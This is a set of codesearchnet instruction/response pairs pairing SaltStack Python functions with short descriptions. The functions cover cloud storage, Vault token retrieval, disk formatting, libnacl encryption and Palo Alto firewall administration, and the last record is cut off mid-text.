{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndeletes an object container in the cloud", "response": "def delete_container(container_name, profile, **libcloud_kwargs):\n    '''\n    Delete an object container in the cloud\n\n    :param container_name: Container name\n    :type  container_name: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param libcloud_kwargs: Extra arguments for the driver's delete_container method\n    :type  libcloud_kwargs: ``dict``\n\n    :return: True if an object container has been successfully deleted, False\n                otherwise.\n    :rtype: ``bool``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.delete_container MyFolder profile1\n    '''\n    conn = _get_driver(profile=profile)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    container = conn.get_container(container_name)\n    return conn.delete_container(container, **libcloud_kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget a token with correct policies for the minion and the url to the Vault", "response": "def _get_token_and_url_from_master():\n    '''\n    Get a token with correct policies for the minion, and the url to the Vault\n    service\n    '''\n    minion_id = __grains__['id']\n    pki_dir = __opts__['pki_dir']\n\n    # When rendering pillars, the module executes on the master, but the token\n    # should be issued for the minion, so that the correct policies are applied\n    if __opts__.get('__role', 'minion') == 'minion':\n        private_key = '{0}/minion.pem'.format(pki_dir)\n        log.debug('Running on minion, signing token request with key %s',\n                  private_key)\n        signature = base64.b64encode(salt.crypt.sign_message(\n            private_key,\n            minion_id\n        ))\n        result = __salt__['publish.runner'](\n            'vault.generate_token',\n            arg=[minion_id, signature]\n        )\n    else:\n        private_key = '{0}/master.pem'.format(pki_dir)\n        log.debug('Running on master, signing token request for %s with key %s',\n                  minion_id, private_key)\n        signature = base64.b64encode(salt.crypt.sign_message(\n            private_key,\n            minion_id\n        ))\n        result = __salt__['saltutil.runner'](\n            'vault.generate_token',\n            minion_id=minion_id,\n            signature=signature,\n            impersonated_by_master=True\n        )\n\n    if not result:\n        log.error('Failed to get token from master! No result returned - '\n                  'is the peer publish configuration correct?')\n        raise salt.exceptions.CommandExecutionError(result)\n    if not isinstance(result, dict):\n        log.error('Failed to get token from master! '\n                  'Response is not a dict: %s', result)\n        raise salt.exceptions.CommandExecutionError(result)\n    if 'error' in result:\n        log.error('Failed to get token from master! '\n                  'An error was returned: %s', result['error'])\n        raise salt.exceptions.CommandExecutionError(result)\n    return {\n        'url': result['url'],\n        'token': result['token'],\n        'verify': result.get('verify', None),\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget the connection details for calling Vault", "response": "def get_vault_connection():\n    '''\n    Get the connection details for calling Vault, from local configuration if\n    it exists, or from the master otherwise\n    '''\n    def _use_local_config():\n        log.debug('Using Vault connection details from local config')\n        try:\n            if __opts__['vault']['auth']['method'] == 'approle':\n                verify = __opts__['vault'].get('verify', None)\n                if _selftoken_expired():\n                    log.debug('Vault token expired. Recreating one')\n                    # Requesting a short ttl token\n                    url = '{0}/v1/auth/approle/login'.format(__opts__['vault']['url'])\n                    payload = {'role_id': __opts__['vault']['auth']['role_id']}\n                    if 'secret_id' in __opts__['vault']['auth']:\n                        payload['secret_id'] = __opts__['vault']['auth']['secret_id']\n                    response = requests.post(url, json=payload, verify=verify)\n                    if response.status_code != 200:\n                        errmsg = 'An error occured while getting a token from approle'\n                        raise salt.exceptions.CommandExecutionError(errmsg)\n                    __opts__['vault']['auth']['token'] = response.json()['auth']['client_token']\n            if __opts__['vault']['auth']['method'] == 'wrapped_token':\n                verify = __opts__['vault'].get('verify', None)\n                if _wrapped_token_valid():\n                    url = '{0}/v1/sys/wrapping/unwrap'.format(__opts__['vault']['url'])\n                    headers = {'X-Vault-Token': __opts__['vault']['auth']['token']}\n                    response = requests.post(url, headers=headers, verify=verify)\n                    if response.status_code != 200:\n                        errmsg = 'An error occured while unwrapping vault token'\n                        raise salt.exceptions.CommandExecutionError(errmsg)\n                    __opts__['vault']['auth']['token'] = response.json()['auth']['client_token']\n            return {\n                'url': __opts__['vault']['url'],\n                'token': __opts__['vault']['auth']['token'],\n                'verify': __opts__['vault'].get('verify', None)\n            }\n        except KeyError as err:\n            errmsg = 'Minion has \"vault\" config section, but could not find key \"{0}\" within'.format(err.message)\n            raise salt.exceptions.CommandExecutionError(errmsg)\n\n    if 'vault' in __opts__ and __opts__.get('__role', 'minion') == 'master':\n        if 'id' in __grains__:\n            log.debug('Contacting master for Vault connection details')\n            return _get_token_and_url_from_master()\n        else:\n            return _use_local_config()\n    elif any((__opts__['local'], __opts__['file_client'] == 'local', __opts__['master_type'] == 'disable')):\n        return _use_local_config()\n    else:\n        log.debug('Contacting master for Vault connection details')\n        return _get_token_and_url_from_master()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef make_request(method, resource, token=None, vault_url=None, get_token_url=False, **args):\n    '''\n    Make a request to Vault\n    '''\n    if not token or not vault_url:\n        connection = get_vault_connection()\n        token, vault_url = connection['token'], connection['url']\n        if 'verify' not in args:\n            args['verify'] = connection['verify']\n\n    url = \"{0}/{1}\".format(vault_url, resource)\n    headers = {'X-Vault-Token': token, 'Content-Type': 'application/json'}\n    response = requests.request(method, url, headers=headers, **args)\n\n    if get_token_url:\n        return response, token, vault_url\n    else:\n        return response", "response": "Make a request to Vault\n           "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef loadavg(name, maximum=None, minimum=None):\n    '''\n    Return the current load average for the specified minion. Available values\n    for name are `1-min`, `5-min` and `15-min`. `minimum` and `maximum` values\n    should be passed in as strings.\n    '''\n    # Monitoring state, no changes will be made so no test interface needed\n    ret = {'name': name,\n           'result': False,\n           'comment': '',\n           'changes': {},\n           'data': {}}  # Data field for monitoring state\n\n    data = __salt__['status.loadavg']()\n    if name not in data:\n        ret['result'] = False\n        ret['comment'] += 'Requested load average {0} not available '.format(\n            name\n        )\n        return ret\n    if minimum and maximum and minimum >= maximum:\n        ret['comment'] += 'Min must be less than max'\n    if ret['comment']:\n        return ret\n    cap = float(data[name])\n    ret['data'] = data[name]\n    if minimum:\n        if cap < float(minimum):\n            ret['comment'] = 'Load avg is below minimum of {0} at {1}'.format(\n                    minimum, cap)\n            return ret\n    if maximum:\n        if cap > float(maximum):\n            ret['comment'] = 'Load avg above maximum of {0} at {1}'.format(\n                    maximum, cap)\n            return ret\n    ret['comment'] = 'Load avg in acceptable range'\n    ret['result'] = True\n    return ret", "response": "Return the current load average for the specified minion."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning whether the specified process signature is found in the process tree.", "response": "def process(name):\n    '''\n    Return whether the specified signature is found in the process tree. This\n    differs slightly from the services states, in that it may refer to a\n    process that is not managed via the init system.\n    '''\n    # Monitoring state, no changes will be made so no test interface needed\n    ret = {'name': name,\n           'result': False,\n           'comment': '',\n           'changes': {},\n           'data': {}}  # Data field for monitoring state\n\n    data = __salt__['status.pid'](name)\n    if not data:\n        ret['result'] = False\n        ret['comment'] += 'Process signature \"{0}\" not found '.format(\n            name\n        )\n        return ret\n    ret['data'] = data\n    ret['comment'] += 'Process signature \"{0}\" was found '.format(\n        name\n    )\n    ret['result'] = True\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef tuned(name, **kwargs):\n    '''\n    Manage options of block device\n\n    name\n        The name of the block device\n\n    opts:\n      - read-ahead\n          Read-ahead buffer size\n\n      - filesystem-read-ahead\n          Filesystem Read-ahead buffer size\n\n      - read-only\n          Set Read-Only\n\n      - read-write\n          Set Read-Write\n    '''\n\n    ret = {'changes': {},\n           'comment': '',\n           'name': name,\n           'result': True}\n\n    kwarg_map = {'read-ahead': 'getra',\n                 'filesystem-read-ahead': 'getfra',\n                 'read-only': 'getro',\n                 'read-write': 'getro'}\n\n    if not __salt__['file.is_blkdev']:\n        ret['comment'] = ('Changes to {0} cannot be applied. '\n                          'Not a block device. ').format(name)\n    elif __opts__['test']:\n        ret['comment'] = 'Changes to {0} will be applied '.format(name)\n        ret['result'] = None\n        return ret\n    else:\n        current = __salt__['disk.dump'](name)\n        changes = __salt__['disk.tune'](name, **kwargs)\n        changeset = {}\n        for key in kwargs:\n            if key in kwarg_map:\n                switch = kwarg_map[key]\n                if current[switch] != changes[switch]:\n                    if isinstance(kwargs[key], bool):\n                        old = (current[switch] == '1')\n                        new = (changes[switch] == '1')\n                    else:\n                        old = current[switch]\n                        new = changes[switch]\n                    if key == 'read-write':\n                        old = not old\n                        new = not new\n                    changeset[key] = 'Changed from {0} to {1}'.format(old, new)\n        if changes:\n            if changeset:\n                ret['comment'] = ('Block device {0} '\n                                  'successfully modified ').format(name)\n                ret['changes'] = changeset\n            else:\n                ret['comment'] = 'Block device {0} already in correct state'.format(name)\n        else:\n            ret['comment'] = 'Failed to modify block device {0}'.format(name)\n            ret['result'] = False\n    return ret", "response": "Manage options of a block device and return a new block device with the specified options."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a new filesystem that is formatted with the specified filesystem type.", "response": "def formatted(name, fs_type='ext4', force=False, **kwargs):\n    '''\n    Manage filesystems of partitions.\n\n    name\n        The name of the block device\n\n    fs_type\n        The filesystem it should be formatted as\n\n    force\n        Force mke2fs to create a filesystem, even if the specified device is\n        not a partition on a block special device. This option is only enabled\n        for ext and xfs filesystems\n\n        This option is dangerous, use it with caution.\n\n        .. versionadded:: 2016.11.0\n    '''\n    ret = {'changes': {},\n           'comment': '{0} already formatted with {1}'.format(name, fs_type),\n           'name': name,\n           'result': False}\n\n    if not os.path.exists(name):\n        ret['comment'] = '{0} does not exist'.format(name)\n        return ret\n\n    current_fs = _checkblk(name)\n\n    if current_fs == fs_type:\n        ret['result'] = True\n        return ret\n    elif not salt.utils.path.which('mkfs.{0}'.format(fs_type)):\n        ret['comment'] = 'Invalid fs_type: {0}'.format(fs_type)\n        ret['result'] = False\n        return ret\n    elif __opts__['test']:\n        ret['comment'] = 'Changes to {0} will be applied '.format(name)\n        ret['result'] = None\n        return ret\n\n    __salt__['disk.format'](name, fs_type, force=force, **kwargs)\n\n    # Repeat fstype check up to 10 times with 3s sleeping between each\n    # to avoid detection failing although mkfs has succeeded\n    # see https://github.com/saltstack/salt/issues/25775\n    # This retry maybe superfluous - switching to blkid\n    for i in range(10):\n\n        log.info('Check blk fstype attempt %d of 10', i + 1)\n        current_fs = _checkblk(name)\n\n        if current_fs == fs_type:\n            ret['comment'] = ('{0} has been formatted '\n                              'with {1}').format(name, fs_type)\n            ret['changes'] = {'new': fs_type, 'old': current_fs}\n            ret['result'] = True\n            return ret\n\n        if current_fs == '':\n            log.info('Waiting 3s before next check')\n            time.sleep(3)\n        else:\n            break\n\n    ret['comment'] = 'Failed to format {0}'.format(name)\n    ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _checkblk(name):\n    '''\n    Check if the blk exists and return its fstype if ok\n    '''\n\n    blk = __salt__['cmd.run']('blkid -o value -s TYPE {0}'.format(name),\n                              ignore_retcode=True)\n    return '' if not blk else blk", "response": "Check if the blk exists and return its fstype if not"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nremoves a configuration element from the SNMP configuration. :param chassis_id: (optional) Chassis ID :param community: (optional) A dictionary having the following optional keys: - acl (if any policy / ACL need to be set) - mode: rw or ro. Default: ro :param contact: Contact details :param location: Location :param test: Dry run? If set as True, will apply the config, discard and return the changes. Default: False :param commit: Commit? (default: True) Sometimes it is not needed to commit the config immediately after loading the changes. E.g.: a state loads a couple of parts (add / remove / update) and would not be optimal to commit after each operation. Also, from the CLI when the user needs to apply the similar changes before committing, can specify commit=False and will not discard the config. :raise MergeConfigException: If there is an error on the configuration sent. :return: A dictionary having the following keys: - result (bool): if the config was applied successfully. It is `False` only in case of failure. In case there are no changes to be applied and successfully performs all operations it is still `True` and so will be the `already_configured` flag (example below) - comment (str): a message for the user - already_configured (bool): flag to check if there were no changes applied - diff (str): returns the config changes applied CLI Example: .. code-block:: bash salt '*' snmp.remove_config community='abcd'", "response": "def remove_config(chassis_id=None,\n                  community=None,\n                  contact=None,\n                  location=None,\n                  test=False,\n                  commit=True,\n                  **kwargs):  # pylint: disable=unused-argument\n\n    '''\n    Removes a configuration element from the SNMP configuration.\n\n    :param chassis_id: (optional) Chassis ID\n\n    :param community: (optional) A dictionary having the following optional keys:\n\n    - acl (if any policy / ACL need to be set)\n    - mode: rw or ro. Default: ro\n\n    :param contact: Contact details\n\n    :param location: Location\n\n    :param test: Dry run? If set as True, will apply the config, discard and return the changes. Default: False\n\n    :param commit: Commit? (default: True) Sometimes it is not needed to commit\n        the config immediately after loading the changes. E.g.: a state loads a\n        couple of parts (add / remove / update) and would not be optimal to\n        commit after each operation.  Also, from the CLI when the user needs to\n        apply the similar changes before committing, can specify commit=False\n        and will not discard the config.\n\n    :raise MergeConfigException: If there is an error on the configuration sent.\n    :return: A dictionary having the following keys:\n\n    - result (bool): if the config was applied successfully. It is `False`\n      only in case of failure. In case there are no changes to be applied\n      and successfully performs all operations it is still `True` and so\n      will be the `already_configured` flag (example below)\n    - comment (str): a message for the user\n    - already_configured (bool): flag to check if there were no changes applied\n    - diff (str): returns the config changes applied\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' snmp.remove_config community='abcd'\n    '''\n\n    dic = {\n        'template_name': 'delete_snmp_config',\n        'test': test,\n        'commit': commit\n    }\n\n    if chassis_id:\n        dic['chassis_id'] = chassis_id\n    if community:\n        dic['community'] = community\n    if contact:\n        dic['contact'] = contact\n    if location:\n        dic['location'] = location\n    dic['inherit_napalm_device'] = napalm_device  # pylint: disable=undefined-variable\n\n    return __salt__['net.load_template'](**dic)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing libnacl to generate a keypair. If no `sk_file` is defined return a keypair. If only the `sk_file` is defined `pk_file` will use the same name with a postfix `.pub`. When the `sk_file` is already existing, but `pk_file` is not. The `pk_file` will be generated using the `sk_file`. CLI Examples: .. code-block:: bash salt-call nacl.keygen salt-call nacl.keygen sk_file=/etc/salt/pki/master/nacl salt-call nacl.keygen sk_file=/etc/salt/pki/master/nacl pk_file=/etc/salt/pki/master/nacl.pub salt-call --local nacl.keygen", "response": "def keygen(sk_file=None, pk_file=None, **kwargs):\n    '''\n    Use libnacl to generate a keypair.\n\n    If no `sk_file` is defined return a keypair.\n\n    If only the `sk_file` is defined `pk_file` will use the same name with a postfix `.pub`.\n\n    When the `sk_file` is already existing, but `pk_file` is not. The `pk_file` will be generated\n    using the `sk_file`.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt-call nacl.keygen\n        salt-call nacl.keygen sk_file=/etc/salt/pki/master/nacl\n        salt-call nacl.keygen sk_file=/etc/salt/pki/master/nacl pk_file=/etc/salt/pki/master/nacl.pub\n        salt-call --local nacl.keygen\n    '''\n    kwargs['opts'] = __opts__\n    return salt.utils.nacl.keygen(sk_file, pk_file, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nencrypts data using SealedBox", "response": "def enc(data, **kwargs):\n    '''\n    Alias to `{box_type}_encrypt`\n\n    box_type: secretbox, sealedbox(default)\n    '''\n    kwargs['opts'] = __opts__\n    return salt.utils.nacl.enc(data, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naliases to `{box_type}_decrypt` box_type: secretbox, sealedbox(default)", "response": "def dec(data, **kwargs):\n    '''\n    Alias to `{box_type}_decrypt`\n\n    box_type: secretbox, sealedbox(default)\n    '''\n    kwargs['opts'] = __opts__\n    return salt.utils.nacl.dec(data, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef sealedbox_encrypt(data, **kwargs):\n    '''\n    Encrypt data using a public key generated from `nacl.keygen`.\n    The encryptd data can be decrypted using `nacl.sealedbox_decrypt` only with the secret key.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt-run nacl.sealedbox_encrypt datatoenc\n        salt-call --local nacl.sealedbox_encrypt datatoenc pk_file=/etc/salt/pki/master/nacl.pub\n        salt-call --local nacl.sealedbox_encrypt datatoenc pk='vrwQF7cNiNAVQVAiS3bvcbJUnF0cN6fU9YTZD9mBfzQ='\n    '''\n    kwargs['opts'] = __opts__\n    return salt.utils.nacl.sealedbox_encrypt(data, **kwargs)", "response": "Encrypt data using a public key generated from nacl. keygen."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nencrypting data using a secret key generated from nacl. keygen", "response": "def secretbox_encrypt(data, **kwargs):\n    '''\n    Encrypt data using a secret key generated from `nacl.keygen`.\n    The same secret key can be used to decrypt the data using `nacl.secretbox_decrypt`.\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt-run nacl.secretbox_encrypt datatoenc\n        salt-call --local nacl.secretbox_encrypt datatoenc sk_file=/etc/salt/pki/master/nacl\n        salt-call --local nacl.secretbox_encrypt datatoenc sk='YmFkcGFzcwo='\n    '''\n    kwargs['opts'] = __opts__\n    return salt.utils.nacl.secretbox_encrypt(data, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_job_results(query=None):\n    '''\n    Executes a query that requires a job for completion. This function will wait for the job to complete\n    and return the results.\n    '''\n    if not query:\n        raise CommandExecutionError(\"Query parameters cannot be empty.\")\n\n    response = __proxy__['panos.call'](query)\n\n    # If the response contains a job, we will wait for the results\n    if 'result' in response and 'job' in response['result']:\n        jid = response['result']['job']\n\n        while get_job(jid)['result']['job']['status'] != 'FIN':\n            time.sleep(5)\n\n        return get_job(jid)\n    else:\n        return response", "response": "Executes a query that requires a job to complete and returns the results."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndeactivate an installed license. Requires version 7. 0. 0 or greater.", "response": "def deactivate_license(key_name=None):\n    '''\n    Deactivates an installed license.\n    Required version 7.0.0 or greater.\n\n    key_name(str): The file name of the license key installed.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.deactivate_license key_name=License_File_Name.key\n\n    '''\n\n    _required_version = '7.0.0'\n    if not __proxy__['panos.is_required_version'](_required_version):\n        return False, 'The panos device requires version {0} or greater for this command.'.format(_required_version)\n\n    if not key_name:\n        return False, 'You must specify a key_name.'\n    else:\n        query = {'type': 'op', 'cmd': '<request><license><deactivate><key><features><member>{0}</member></features>'\n                                      '</key></deactivate></license></request>'.format(key_name)}\n\n    return __proxy__['panos.call'](query)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef download_software_file(filename=None, synch=False):\n    '''\n    Download software packages by filename.\n\n    Args:\n        filename(str): The filename of the PANOS file to download.\n\n        synch (bool): If true then the file will synch to the peer unit.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.download_software_file PanOS_5000-8.0.0\n        salt '*' panos.download_software_file PanOS_5000-8.0.0 True\n\n    '''\n    if not filename:\n        raise CommandExecutionError(\"Filename option must not be none.\")\n\n    if not isinstance(synch, bool):\n        raise CommandExecutionError(\"Synch option must be boolean..\")\n\n    if synch is True:\n        query = {'type': 'op',\n                 'cmd': '<request><system><software><download>'\n                        '<file>{0}</file></download></software></system></request>'.format(filename)}\n    else:\n        query = {'type': 'op',\n                 'cmd': '<request><system><software><download><sync-to-peer>yes</sync-to-peer>'\n                        '<file>{0}</file></download></software></system></request>'.format(filename)}\n\n    return _get_job_results(query)", "response": "Download software packages by filename."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef download_software_version(version=None, synch=False):\n    '''\n    Download software packages by version number.\n\n    Args:\n        version(str): The version of the PANOS file to download.\n\n        synch (bool): If true then the file will synch to the peer unit.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.download_software_version 8.0.0\n        salt '*' panos.download_software_version 8.0.0 True\n\n    '''\n    if not version:\n        raise CommandExecutionError(\"Version option must not be none.\")\n\n    if not isinstance(synch, bool):\n        raise CommandExecutionError(\"Synch option must be boolean..\")\n\n    if synch is True:\n        query = {'type': 'op',\n                 'cmd': '<request><system><software><download>'\n                        '<version>{0}</version></download></software></system></request>'.format(version)}\n    else:\n        query = {'type': 'op',\n                 'cmd': '<request><system><software><download><sync-to-peer>yes</sync-to-peer>'\n                        '<version>{0}</version></download></software></system></request>'.format(version)}\n\n    return _get_job_results(query)", "response": "Download software packages by version number."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndisplays all jobs on the device.", "response": "def get_jobs(state='all'):\n    '''\n    List all jobs on the device.\n\n    state\n        The state of the jobs to display. Valid options are all, pending, or processed. Pending jobs are jobs\n        that are currently in a running or waiting state. Processed jobs are jobs that have completed\n        execution.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.get_jobs\n        salt '*' panos.get_jobs state=pending\n\n    '''\n    if state.lower() == 'all':\n        query = {'type': 'op', 'cmd': '<show><jobs><all></all></jobs></show>'}\n    elif state.lower() == 'pending':\n        query = {'type': 'op', 'cmd': '<show><jobs><pending></pending></jobs></show>'}\n    elif state.lower() == 'processed':\n        query = {'type': 'op', 'cmd': '<show><jobs><processed></processed></jobs></show>'}\n    else:\n        raise CommandExecutionError(\"The state parameter must be all, pending, or processed.\")\n\n    return __proxy__['panos.call'](query)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_local_admins():\n    '''\n    Show all local administrator accounts.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.get_local_admins\n\n    '''\n    admin_list = get_users_config()\n    response = []\n\n    if 'users' not in admin_list['result']:\n        return response\n\n    if isinstance(admin_list['result']['users']['entry'], list):\n        for entry in admin_list['result']['users']['entry']:\n            response.append(entry['name'])\n    else:\n        response.append(admin_list['result']['users']['entry']['name'])\n\n    return response", "response": "Show all local administrator accounts."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_uncommitted_changes():\n    '''\n    Retrieve a list of all uncommitted changes on the device.\n    Requires PANOS version 8.0.0 or greater.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.get_uncommitted_changes\n\n    '''\n    _required_version = '8.0.0'\n    if not __proxy__['panos.is_required_version'](_required_version):\n        return False, 'The panos device requires version {0} or greater for this command.'.format(_required_version)\n\n    query = {'type': 'op',\n             'cmd': '<show><config><list><changes></changes></list></config></show>'}\n\n    return __proxy__['panos.call'](query)", "response": "Retrieves a list of all uncommitted changes on the device. Requires PANOS version 8. 0. 0 or greater."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef install_antivirus(version=None, latest=False, synch=False, skip_commit=False,):\n    '''\n    Install anti-virus packages.\n\n    Args:\n        version(str): The version of the PANOS file to install.\n\n        latest(bool): If true, the latest anti-virus file will be installed.\n                      The specified version option will be ignored.\n\n        synch(bool): If true, the anti-virus will synch to the peer unit.\n\n        skip_commit(bool): If true, the install will skip committing to the device.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.install_antivirus 8.0.0\n\n    '''\n    if not version and latest is False:\n        raise CommandExecutionError(\"Version option must not be none.\")\n\n    if synch is True:\n        s = \"yes\"\n    else:\n        s = \"no\"\n\n    if skip_commit is True:\n        c = \"yes\"\n    else:\n        c = \"no\"\n\n    if latest is True:\n        query = {'type': 'op',\n                 'cmd': '<request><anti-virus><upgrade><install>'\n                        '<commit>{0}</commit><sync-to-peer>{1}</sync-to-peer>'\n                        '<version>latest</version></install></upgrade></anti-virus></request>'.format(c, s)}\n    else:\n        query = {'type': 'op',\n                 'cmd': '<request><anti-virus><upgrade><install>'\n                        '<commit>{0}</commit><sync-to-peer>{1}</sync-to-peer>'\n                        '<version>{2}</version></install></upgrade></anti-virus></request>'.format(c, s, version)}\n\n    return _get_job_results(query)", "response": "Install anti - virus packages."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef refresh_fqdn_cache(force=False):\n    '''\n    Force refreshes all FQDNs used in rules.\n\n    force\n        Forces all fqdn refresh\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.refresh_fqdn_cache\n        salt '*' panos.refresh_fqdn_cache force=True\n\n    '''\n    if not isinstance(force, bool):\n        raise CommandExecutionError(\"Force option must be boolean.\")\n\n    if force:\n        query = {'type': 'op',\n                 'cmd': '<request><system><fqdn><refresh><force>yes</force></refresh></fqdn></system></request>'}\n    else:\n        query = {'type': 'op', 'cmd': '<request><system><fqdn><refresh></refresh></fqdn></system></request>'}\n\n    return __proxy__['panos.call'](query)", "response": "Refreshes all FQDNs used in rules."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nresolve an IP address to a specific virtual server.", "response": "def resolve_address(address=None, vsys=None):\n    '''\n    Resolve address to ip address.\n    Required version 7.0.0 or greater.\n\n    address\n        Address name you want to resolve.\n\n    vsys\n        The vsys name.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' panos.resolve_address foo.bar.com\n        salt '*' panos.resolve_address foo.bar.com vsys=2\n\n    '''\n    _required_version = '7.0.0'\n    if not __proxy__['panos.is_required_version'](_required_version):\n        return False, 'The panos device requires version {0} or greater for this command.'.format(_required_version)\n\n    if not address:\n        raise CommandExecutionError(\"FQDN to resolve must be provided as address.\")\n\n    if not vsys:\n        query = {'type': 'op',\n                 'cmd': '<request><resolve><address>{0}</address></resolve></request>'.format(address)}\n    else:\n        query = {'type': 'op',\n                 'cmd': '<request><resolve><vsys>{0}</vsys><address>{1}</address></resolve>'\n                        '</request>'.format(vsys, address)}\n\n    return __proxy__['panos.call'](query)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_authentication_profile(profile=None, deploy=False):\n    '''\n    Set the authentication profile of the Palo Alto proxy minion. A commit will be required before this is processed.\n\n    CLI Example:\n\n    Args:\n        profile (str): The name of the authentication profile to set.\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' panos.set_authentication_profile foo\n        salt '*' panos.set_authentication_profile foo deploy=True\n\n    '''\n\n    if not profile:\n        raise CommandExecutionError(\"Profile name option must not be none.\")\n\n    ret = {}\n\n    query = {'type': 'config',\n             'action': 'set',\n             'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/'\n                      'authentication-profile',\n             'element': '<authentication-profile>{0}</authentication-profile>'.format(profile)}\n\n    ret.update(__proxy__['panos.call'](query))\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret", "response": "Set the authentication profile of the Palo Alto proxy minion."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_hostname(hostname=None, deploy=False):\n    '''\n    Set the hostname of the Palo Alto proxy minion. A commit will be required before this is processed.\n\n    CLI Example:\n\n    Args:\n        hostname (str): The hostname to set\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' panos.set_hostname newhostname\n        salt '*' panos.set_hostname newhostname deploy=True\n\n    '''\n\n    if not hostname:\n        raise CommandExecutionError(\"Hostname option must not be none.\")\n\n    ret = {}\n\n    query = {'type': 'config',\n             'action': 'set',\n             'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system',\n             'element': '<hostname>{0}</hostname>'.format(hostname)}\n\n    ret.update(__proxy__['panos.call'](query))\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret", "response": "Sets the hostname of the Palo Alto proxy minion."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nenable or disables the ICMP management service on the device.", "response": "def set_management_icmp(enabled=True, deploy=False):\n    '''\n    Enables or disables the ICMP management service on the device.\n\n    CLI Example:\n\n    Args:\n        enabled (bool): If true the service will be enabled. If false the service will be disabled.\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' panos.set_management_icmp\n        salt '*' panos.set_management_icmp enabled=False deploy=True\n\n    '''\n\n    if enabled is True:\n        value = \"no\"\n    elif enabled is False:\n        value = \"yes\"\n    else:\n        raise CommandExecutionError(\"Invalid option provided for service enabled option.\")\n\n    ret = {}\n\n    query = {'type': 'config',\n             'action': 'set',\n             'xpath': '/config/devices/entry[@name=\\'localhost.localdomain\\']/deviceconfig/system/service',\n             'element': '<disable-icmp>{0}</disable-icmp>'.format(value)}\n\n    ret.update(__proxy__['panos.call'](query))\n\n    if deploy is True:\n        ret.update(commit())\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_ntp_authentication(target=None,\n                           authentication_type=None,\n                           key_id=None,\n                           authentication_key=None,\n                           algorithm=None,\n                           deploy=False):\n    '''\n    Set the NTP authentication of the Palo Alto proxy minion. A commit will be required before this is processed.\n\n    CLI Example:\n\n    Args:\n        target(str): Determines the target of the authentication. Valid options are primary, secondary, or both.\n\n        authentication_type(str): The authentication type to be used. Valid options are symmetric, autokey, and none.\n\n        key_id(int): The NTP authentication key ID.\n\n        authentication_key(str): The authentication key.\n\n        algorithm(str): The algorithm type to be used for a symmetric key. Valid options are md5 and sha1.\n\n        deploy (bool): If true then commit the full candidate configuration, if false only set pending change.\n\n    .. code-block:: bash\n\n        salt '*' ntp.set_authentication target=both authentication_type=autokey\n        salt '*' ntp.set_authentication target=primary authentication_type=none\n        salt '*' ntp.set_authentication target=both authentication_type=symmetric key_id=15 authentication_key=mykey algorithm=md5\n        salt '*' ntp.set_authentication target=both 